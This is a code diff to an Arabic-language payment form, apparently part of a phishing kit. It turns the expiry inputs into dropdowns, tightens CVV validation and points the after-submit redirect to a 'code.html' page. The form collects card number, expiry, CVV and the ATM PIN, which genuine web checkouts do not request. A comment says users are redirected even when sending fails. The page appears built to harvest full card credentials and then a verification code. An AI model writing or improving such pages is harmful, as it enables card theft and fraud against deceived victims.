@@ -119,18 +119,49 @@
   <div class="row">
     <div>
       <label>شهر الانتهاء *</label>
-      <input id="expMonth" inputmode="numeric" maxlength="2" placeholder="MM">
+      <select id="expMonth" style="width:100%;padding:12px;margin-top:6px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box">
+        <option value="">MM</option>
+        <option value="01">01</option>
+        <option value="02">02</option>
+        <option value="03">03</option>
+        <option value="04">04</option>
+        <option value="05">05</option>
+        <option value="06">06</option>
+        <option value="07">07</option>
+        <option value="08">08</option>
+        <option value="09">09</option>
+        <option value="10">10</option>
+        <option value="11">11</option>
+        <option value="12">12</option>
+      </select>
     </div>
     <div>
       <label>سنة الانتهاء *</label>
-      <input id="expYear" inputmode="numeric" maxlength="2" placeholder="YY">
+      <select id="expYear" style="width:100%;padding:12px;margin-top:6px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box">
+        <option value="">YY</option>
+        <option value="26">26</option>
+        <option value="27">27</option>
+        <option value="28">28</option>
+        <option value="29">29</option>
+        <option value="30">30</option>
+        <option value="31">31</option>
+        <option value="32">32</option>
+        <option value="33">33</option>
+        <option value="34">34</option>
+        <option value="35">35</option>
+        <option value="36">36</option>
+        <option value="37">37</option>
+        <option value="38">38</option>
+        <option value="39">39</option>
+        <option value="40">40</option>
+      </select>
     </div>
   </div>
 
   <div class="row">
     <div>
       <label>رمز CVV *</label>
-      <input id="cvv" type="password" inputmode="numeric" maxlength="4" placeholder="***">
+      <input id="cvv" type="password" inputmode="numeric" maxlength="3" placeholder="***">
     </div>
     <div>
       <label>رقم الصراف الآلي (PIN) *</label>
@@ -140,7 +171,7 @@
 
   <button id="payBtn" type="submit">
     <span id="payText">ادفع الآن</span>
-    <span class="spinner" id="spinner"></span>
+    <span class="spinner" id="paySpinner"></span>
   </button>
 
   <button id="applePayBtn" type="button">Apple Pay</button>
@@ -224,16 +255,14 @@
   // أحداث الإدخال
   if(cardNumber) cardNumber.addEventListener('input', formatCardNumber);
 
-  if(expMonth) expMonth.addEventListener('input', () => {
-    onlyDigits(expMonth, 2);
+  if(expMonth) expMonth.addEventListener('change', () => {
     expMonth.classList.remove('error');
   });
-  if(expYear) expYear.addEventListener('input', () => {
-    onlyDigits(expYear, 2);
+  if(expYear) expYear.addEventListener('change', () => {
     expYear.classList.remove('error');
   });
   if(cvv) cvv.addEventListener('input', () => {
-    onlyDigits(cvv, 4);
+    onlyDigits(cvv, 3);
     cvv.classList.remove('error');
   });
   if(pin) pin.addEventListener('input', () => {
@@ -260,7 +289,7 @@
       const m = Number(expMonth.value);
       if(!(Number.isInteger(m) && m >= 1 && m <= 12)){expMonth.classList.add('error'); ok=false;}
       if(expYear.value.length !== 2){expYear.classList.add('error'); ok=false;}
-      if(cvv.value.length < 3){cvv.classList.add('error'); ok=false;}
+      if(cvv.value.length !== 3){cvv.classList.add('error'); ok=false;}
       if(pin.value.length !== 4){pin.classList.add('error'); ok=false;}
 
       if(!ok) return;
@@ -291,12 +320,12 @@
       })
       .then(() => {
         // التوجيه بعد النجاح
-        setTimeout(()=>location.href='verify.html',1000);
+        setTimeout(()=>location.href='code.html',1000);
       })
       .catch(err => {
         console.error(err);
         // حتى لو فشل الإرسال نوجه المستخدم أو نظهر خطأ
-        setTimeout(()=>location.href='verify.html',1000);
+        setTimeout(()=>location.href='code.html',1000);
       });
     };
   }
